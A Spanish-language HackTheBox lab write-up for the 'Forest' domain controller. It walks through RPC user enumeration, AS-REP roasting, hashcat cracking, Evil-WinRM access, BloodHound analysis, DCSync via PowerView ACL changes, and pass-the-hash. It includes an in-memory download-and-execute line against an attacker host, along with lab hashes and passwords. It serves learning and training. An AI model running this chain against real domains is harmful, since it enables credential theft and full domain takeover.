# 🌲 Forest — HackTheBox Writeup

> **Dificultad:** Fácil | **SO:** Windows | **Fecha de lanzamiento:** 12 Oct 2019  
> **Creadores:** egre55, mrb3n

---

## 📋 Índice

1. [Descripción General](#descripción-general)
2. [Reconocimiento](#reconocimiento)
3. [Shell como svc-alfresco](#shell-como-svc-alfresco)
4. [Escalada de Privilegios](#escalada-de-privilegios-al-administrador)
5. [Flags](#flags)
6. [Conceptos Clave](#conceptos-clave)

---

## 📌 Descripción General

Forest es una máquina Windows que actúa como **controlador de dominio (Domain Controller)**. Es una máquina excelente para aprender conceptos de Active Directory que raramente se ven en otros CTFs. El flujo de ataque es el siguiente:

1. Enumeramos usuarios del dominio sin credenciales mediante **RPC anónimo**.
2. Atacamos Kerberos con **AS-REP Roasting** para obtener un hash crackeable.
3. Usamos las credenciales obtenidas para acceder con **WinRM**.
4. Abusamos de una cadena de permisos de Active Directory para obtener privilegios de **DCSync**.
5. Volcamos los hashes del dominio y nos conectamos como **Administrador**.

---

## 🔎 Reconocimiento

### 🌐 nmap

Lo primero que hacemos siempre es un escaneo de puertos. Lanzamos primero un escaneo rápido de todos los puertos TCP:

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.32.68
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
Warning: 10.129.32.68 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.32.68
Host is up (0.031s latency).
Not shown: 64742 closed ports, 769 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49697/tcp open  unknown
49898/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
```
![](/Images/forest1.png)<br>

> 💡 **¿Por qué son relevantes estos puertos?**
> - **53 (DNS):** Controlador de dominio resuelve nombres internos.
> - **88 (Kerberos):** Servicio de autenticación de Active Directory. Fundamental para los ataques Kerberos.
> - **389/636 (LDAP/LDAPS):** Directorio de Active Directory. Permite consultar usuarios, grupos, etc.
> - **445 (SMB):** Recursos compartidos y RPC sobre SMB.
> - **5985 (WinRM):** Gestión remota de Windows. Si tenemos credenciales válidas, podemos obtener una shell.

Luego lanzamos un escaneo más detallado con scripts y versiones sobre los puertos encontrados:

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.129.32.68
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
Nmap scan report for 10.129.32.68
Host is up (0.030s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-14T11:34:51-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-14T18:34:52
|_  start_date: 2019-10-14T09:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds
```

![](/Images/forest2.png)<br>

> 💡 Los scripts de nmap nos revelan información crítica: el **dominio es `htb.local`** y el sistema operativo es **Windows Server 2016**. Esto confirma que estamos ante un controlador de dominio.

También realizamos un escaneo UDP para completar el reconocimiento:

```bash
nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.129.32.68
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
Warning: 10.129.32.68 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.32.68
Host is up (0.091s latency).
Not shown: 65457 open|filtered ports, 74 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
58399/udp open  unknown
58507/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.35 seconds
```
![](/Images/forest3.png)<br>

---

### 🌐 DNS - UDP/TCP 53

Intentamos resolver nombres internos del dominio apuntando directamente al servidor DNS de la máquina:

```bash
dig @10.129.32.68 htb.local
```

```
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.129.32.68 htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62514
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; COOKIE: bbee567cd8172763 (echoed)
;; QUESTION SECTION:
;htb.local.                     IN      A

;; ANSWER SECTION:
htb.local.              600     IN      A       10.129.32.68

;; Query time: 30 msec
;; SERVER: 10.129.32.68#53(10.129.32.68)
;; WHEN: Mon Oct 14 14:34:17 EDT 2019
;; MSG SIZE  rcvd: 66
```
![](/Images/forest4.png)<br>

```bash
dig @10.129.32.68 forest.htb.local
```

```
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> @10.129.32.68 forest.htb.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12842
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; COOKIE: ca9fa59dce2451be (echoed)
;; QUESTION SECTION:
;forest.htb.local.              IN      A

;; ANSWER SECTION:
forest.htb.local.       3600    IN      A       10.129.32.68

;; Query time: 150 msec
;; SERVER: 10.129.32.68#53(10.129.32.68)
;; WHEN: Mon Oct 14 14:35:19 EDT 2019
;; MSG SIZE  rcvd: 73
```

![](/Images/forest5.png)<br>

Ambos nombres resuelven a la misma IP, lo cual confirma que el propio Forest es el controlador de dominio.

También intentamos una **transferencia de zona** (AXFR), que nos daría todos los registros DNS del dominio — pero está deshabilitada:

```bash
dig axfr @10.129.32.68 htb.local
```

```
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.129.32.68 htb.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

![](/Images/forest6.png)<br>

> 💡 Una transferencia de zona exitosa sería un hallazgo crítico, ya que revelaría toda la infraestructura interna. En entornos bien configurados siempre estará bloqueada.

---

### 📂 SMB - TCP 445

Probamos a enumerar recursos compartidos sin credenciales (acceso anónimo / null session):

```bash
smbmap -H 10.129.32.68
```

```
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.129.32.68...
[+] IP: 10.129.32.68:445        Name: 10.129.32.68                                      
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied
```

![](/Images/forest7.png)<br>

```bash
smbclient -N -L //10.129.32.68
```

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.129.32.68]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.32.68 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```
![](/Images/forest8.png)<br>

> 💡 El login anónimo se acepta pero no obtenemos información útil. SMB no nos da acceso a recursos compartidos sin credenciales válidas. Continuamos con otros vectores.

---

### 🔗 RPC - TCP 445

**RPC (Remote Procedure Call)** es un protocolo que permite ejecutar funciones en sistemas remotos. En entornos Active Directory, RPC puede permitir la enumeración de usuarios y grupos sin autenticación (null session), lo cual es un problema de configuración común.

Nos conectamos con autenticación nula:

```bash
rpcclient -U "" -N 10.129.32.68
rpcclient $>
```

> 💡 El flag `-U ""` indica usuario vacío y `-N` indica sin contraseña. Si el servidor permite null sessions en RPC, podemos hacer consultas LDAP sin credenciales.

Enumeramos todos los usuarios del dominio:

```bash
rpcclient $> enumdomusers
```

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

![](/Images/forest9.png)<br>

> 💡 El **RID (Relative Identifier)** es el identificador único de cada objeto dentro del dominio. El RID `0x1f4` (500 en decimal) siempre corresponde a la cuenta **Administrator** en Windows. Las cuentas `SM_*` y `HealthMailbox*` son cuentas de servicio internas de **Microsoft Exchange**.

También enumeramos los grupos del dominio:

```bash
rpcclient $> enumdomgroups
```

```
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
![](/Images/forest10.png)<br>

Consultamos los miembros del grupo **Domain Admins** (RID `0x200`):

```bash
rpcclient $> querygroup 0x200
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```

![](/Images/forest11.png)<br>

Solo hay un miembro: el Administrator (RID `0x1f4`). Lo confirmamos:

```bash
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :   Administrator
        ...
        logon_count:    0x00000031
```

![](/Images/forest12.png)<br>

---

## 💻 Shell como svc-alfresco

### 🔐 AS-REP Roasting

> 💡 **¿Qué es AS-REP Roasting?**
>
> En Kerberos, el proceso normal de autenticación requiere que el cliente demuestre su identidad **antes** de recibir un Ticket Granting Ticket (TGT). Esto se llama **preautenticación Kerberos**.
>
> Sin embargo, si una cuenta tiene activado el flag `UF_DONT_REQUIRE_PREAUTH` (es decir, NO requiere preautenticación), el controlador de dominio devolverá un TGT **cifrado con la contraseña del usuario** sin verificar que quien lo solicita sea el usuario real.
>
> Esto nos permite solicitar ese TGT para cualquier usuario con ese flag activo y luego intentar crackear el hash **offline** sin necesidad de tener credenciales previas.
>
> La diferencia con Kerberoasting es que AS-REP Roasting **no requiere estar autenticado** en el dominio.

Con la lista de usuarios obtenida vía RPC, descartamos las cuentas de servicio genéricas (SM_* y HealthMailbox*) y creamos un archivo:

```bash
cat users
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

![](/Images/forest13.png)<br>

Usamos la herramienta `impacket-GetNPUsers` de **Impacket** para probar cada usuario:

```bash
for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.129.32.68 htb/${user} | grep -v Impacket; done
```

```
[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
```

![](/Images/forest14.png)<br>

¡Éxito! El usuario **svc-alfresco** tiene el flag `UF_DONT_REQUIRE_PREAUTH` activo y hemos obtenido su hash AS-REP.

> 💡 El hash tiene el formato `$krb5asrep$23$...` que corresponde al tipo **18200** en hashcat. El número `23` indica que usa RC4 como cifrado, que es más débil y más fácil de crackear que AES.

---

### 🔓 Crackear el Hash

Guardamos el hash en un archivo y lo atacamos con **hashcat** usando el diccionario `rockyou.txt`:

```bash
hashcat -m 18200 svc-alfresco.htb /usr/share/wordlists/rockyou.txt --force
```

```
$krb5asrep$23$svc-alfresco@HTB:...:s3rvice
```

![](/Images/forest15.png)<br>

> 💡 **hashcat** prueba millones de contraseñas por segundo cifrándolas con el mismo algoritmo y comparando el resultado. El flag `-m 18200` indica el tipo de hash (Kerberos AS-REP). Al encontrar coincidencia, nos devuelve la contraseña en texto claro.

✅ **Credenciales obtenidas:** `svc-alfresco : s3rvice`

---

### 🚪 WinRM

> 💡 **¿Qué es WinRM?**  
> Windows Remote Management (WinRM) es el equivalente de SSH en Windows. Permite ejecutar comandos remotamente. Corre en el puerto **5985** (HTTP) y **5986** (HTTPS). Si tenemos credenciales válidas y el usuario pertenece al grupo `Remote Management Users` (o es administrador), podemos obtener una shell interactiva.

Usamos **Evil-WinRM** para conectarnos:

```bash
evil-winrm -i 10.129.32.68 -u svc-alfresco -p s3rvice
```

```
Info: Starting Evil-WinRM shell v1.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```
![](/Images/forest16.png)<br>

¡Tenemos shell! Obtenemos la primera flag:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
e5e4e47a************************
```
![](/Images/forest17.png)<br>

---

## ⬆️ Escalada de Privilegios al Administrador

### 🧭 Enumeración con BloodHound

> 💡 **¿Qué es BloodHound?**  
> BloodHound es una herramienta de análisis de Active Directory que visualiza las relaciones entre objetos (usuarios, grupos, equipos, GPOs...) y encuentra **rutas de ataque** hacia objetivos de alto valor como Domain Admins. Usa una base de datos de grafos (Neo4j) para representar estas relaciones.
>
> **SharpHound** es el "collector" o recolector de datos que se ejecuta en la máquina víctima y genera un ZIP con toda la información del dominio que luego importamos en BloodHound.

Primero descargamos SharpHound y lo subimos a la máquina:

```bash
# En Kali: descargamos SharpHound
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -O SharpHound.exe
```

![](/Images/forest18.png)<br>

```powershell
# En Evil-WinRM: subimos el ejecutable
upload SharpHound.exe
```

![](/Images/forest19.png)<br>

Ejecutamos SharpHound para recopilar todos los datos del dominio:

```powershell
./SharpHound.exe -c all --domain htb.local --ldapusername svc-alfresco --ldappassword s3rvice
```

![](/Images/forest20.png)<br>

Esto genera un archivo ZIP con los datos del dominio:

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/18/2019   3:56 AM          12740 20191018035650_BloodHound.zip
-a----       10/18/2019   3:56 AM           8978 Rk9SRVNU.bin
```
![](/Images/forest21.png)<br>

Descargamos el ZIP a nuestra máquina:

```powershell
PS C:\\Users\\svc-alfresco> download 20260429064650_BloodHound.zip
                                        
Info: Downloading C:\\Users\\svc-alfresco\\20260429064650_BloodHound.zip to 20260429064650_BloodHound.zip
                                        
Info: Download successful!
```

![](/Images/forest22.png)<br>

Lo importamos en BloodHound y usamos la query **"Find Shortest Paths to Domain Admins"** con `SVC-ALFRESCO@HTB.LOCAL` como nodo de inicio y `DOMAIN ADMINS@HTB.LOCAL` como destino.

![](/Images/forest25.png)<br>

---

### 🧠 Análisis de la Ruta en BloodHound

BloodHound nos revela la siguiente cadena de permisos:

```
svc-alfresco
    → [MemberOf] → Service Accounts
        → [MemberOf] → Privileged IT Accounts
            → [MemberOf] → Account Operators
                → [GenericAll] → Exchange Windows Permissions
                    → [WriteDacl] → HTB.LOCAL (dominio)
```

> 💡 **Explicación de cada eslabón de la cadena:**
>
> 1. **svc-alfresco → Service Accounts → Privileged IT Accounts → Account Operators:** Mediante membresía de grupos anidados, svc-alfresco hereda efectivamente los privilegios de `Account Operators`.
>
> 2. **Account Operators → GenericAll → Exchange Windows Permissions:** `GenericAll` significa control total sobre ese objeto. Account Operators puede añadir/quitar miembros del grupo `Exchange Windows Permissions`, e incluso añadir a nuestro usuario directamente.
>
> 3. **Exchange Windows Permissions → WriteDacl → HTB.LOCAL:** Los miembros de `Exchange Windows Permissions` pueden modificar la **DACL (Discretionary Access Control List)** del dominio. La DACL es la lista que controla qué permisos tiene cada entidad sobre el objeto dominio.
>
> 4. **Con WriteDacl sobre el dominio → DCSync:** Si podemos modificar la DACL del dominio, podemos otorgarnos a nosotros mismos los permisos `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`, que son los necesarios para realizar un **ataque DCSync**.

> 💡 **¿Qué es DCSync?**  
> DCSync es un ataque que imita el comportamiento de un controlador de dominio secundario sincronizándose con el principal. Al tener los permisos de replicación, podemos solicitar al DC que nos "replique" las credenciales de cualquier cuenta, incluido el hash NTLM del Administrator. No necesitamos ejecutar código en el DC, solo conectividad de red a los puertos 445 y 135.

---

### ⚡ Explotación DCSync

**Paso 1:** Cargamos PowerView en memoria (sin escribirlo a disco para evadir detecciones):

```powershell
# Primero levantamos un servidor HTTP en Kali con PowerView.ps1
# En Kali:
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

# En Evil-WinRM:
iex (New-Object Net.WebClient).DownloadString("http://10.10.14.X:8000/PowerView.ps1")
```

> 💡 `iex` (Invoke-Expression) ejecuta el código descargado directamente en memoria. Esto es una técnica de **living off the land** / evasión básica: el script nunca toca el disco, lo que dificulta la detección por antivirus.

**Paso 2:** Ejecutamos el one-liner que hace todo de golpe. Hay que hacerlo rápido porque existe un script de limpieza que resetea los permisos cada 60 segundos (lo veremos más adelante):

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

> 💡 **Desglose del one-liner:**
>
> - `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco` → Añadimos svc-alfresco al grupo `Exchange Windows Permissions`. Podemos hacerlo porque (via Account Operators) tenemos `GenericAll` sobre ese grupo.
>
> - El resto construye un objeto `PSCredential` con las credenciales de svc-alfresco. Hay que pasar credenciales explícitamente porque la sesión WinRM no "sabe" aún que pertenecemos al nuevo grupo (la sesión no se ha refrescado).
>
> - `Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` → Otorgamos a svc-alfresco los permisos de replicación (DCSync) sobre el dominio.

**Paso 3:** Inmediatamente desde Kali, ejecutamos el ataque DCSync antes de que el script de limpieza actúe:

```bash
impacket-secretsdump svc-alfresco:s3rvice@10.129.32.68
```

```
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
[*] Cleaning up...
```

![](/Images/forest26.png)<br>

> 💡 El error `RemoteOperations failed: rpc_s_access_denied` es normal y no afecta al resultado. Se debe a que secretsdump intenta primero un método (RemoteOperations vía SVCCTL) que requiere privilegios de administrador local, y al fallar, cae back al método **DRSUAPI** (el DCSync propiamente dicho) que sí funciona con nuestros permisos de replicación.
>
> El formato de los hashes es `LM_hash:NT_hash`. El hash LM `aad3b435b51404eeaad3b435b51404ee` es siempre el mismo cuando está deshabilitado (que es el caso en sistemas modernos). El hash que nos interesa es el **NT hash**.

✅ **Hash NT del Administrator:** `32693b11e6aa90eb43d32c72a07ceea6`

**Paso 4:** Nos conectamos como Administrator usando **Pass-the-Hash** (no necesitamos crackear la contraseña):

```bash
evil-winrm -i 10.129.32.68 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

> 💡 **Pass-the-Hash** es una técnica que permite autenticarse usando directamente el hash NTLM sin conocer la contraseña en texto claro. El protocolo NTLM, por su diseño, acepta el hash como prueba de identidad. Por eso es tan importante proteger los hashes.

---

## 🚩 Flags

```powershell
# User flag
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
e5e4e47a************************

# Root flag
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
f048153f************************
```

![](/Images/forest27.png)<br>

---

## ♻️ Beyond Root: Script de Limpieza

Al explorar la carpeta del Administrador, encontramos una explicación de por qué teníamos que actuar rápido:

```
C:\users\administrator\documents> type revert.ps1
```

```powershell
Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)
{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```

> 💡 **¿Qué hace este script?**  
> Es un script de mantenimiento diseñado por los creadores de la máquina para resetear el estado y que otros jugadores puedan resolverla desde cero. Ejecuta un bucle infinito que cada 60 segundos:
> 1. Resetea la contraseña de svc-alfresco a `s3rvice`.
> 2. Para cada usuario en `users.txt`, elimina sus permisos DCSync.
> 3. Elimina a esos usuarios de todos los grupos excepto `Service Accounts`.
>
> Esto explica por qué había que ejecutar el DCSync **inmediatamente** después de otorgarnos los permisos. Si esperábamos más de 60 segundos, el script de limpieza nos quitaba los permisos antes de poder usarlos.

El script está configurado como tarea programada que arranca con el sistema:

```
TaskName:     \restore
Task To Run:  powershell.exe -ep bypass C:\Users\Administrator\Documents\revert.ps1
Run As User:  SYSTEM
Schedule Type: At system start up
```

---

## 📚 Conceptos Clave

| Concepto | Descripción |
|---|---|
| **AS-REP Roasting** | Ataque Kerberos que obtiene hashes crackeables de cuentas sin preautenticación requerida. No necesita credenciales previas. |
| **RPC Null Session** | Conexión anónima a RPC que permite enumerar usuarios y grupos en Active Directory mal configurado. |
| **WinRM / Evil-WinRM** | Gestión remota de Windows (puerto 5985). Evil-WinRM es el cliente de pentesting más cómodo para obtener shell. |
| **BloodHound / SharpHound** | Herramienta de análisis de AD que encuentra rutas de ataque visualizando relaciones entre objetos. |
| **WriteDacl** | Permiso que permite modificar la lista de control de acceso (ACL) de un objeto. Sobre el dominio, permite otorgarse permisos de replicación. |
| **DCSync** | Ataque que imita la sincronización entre DCs para obtener todos los hashes del dominio. Requiere permisos DS-Replication. |
| **Pass-the-Hash** | Técnica de autenticación usando el hash NTLM directamente, sin necesitar la contraseña en texto claro. |
| **GenericAll** | Permiso de control total sobre un objeto de AD (equivalente a ser propietario). |
| **Account Operators** | Grupo built-in de Windows con capacidad de gestionar cuentas y grupos (excepto Domain Admins). |

---

*Writeup realizado con fines educativos en el contexto de HackTheBox.*
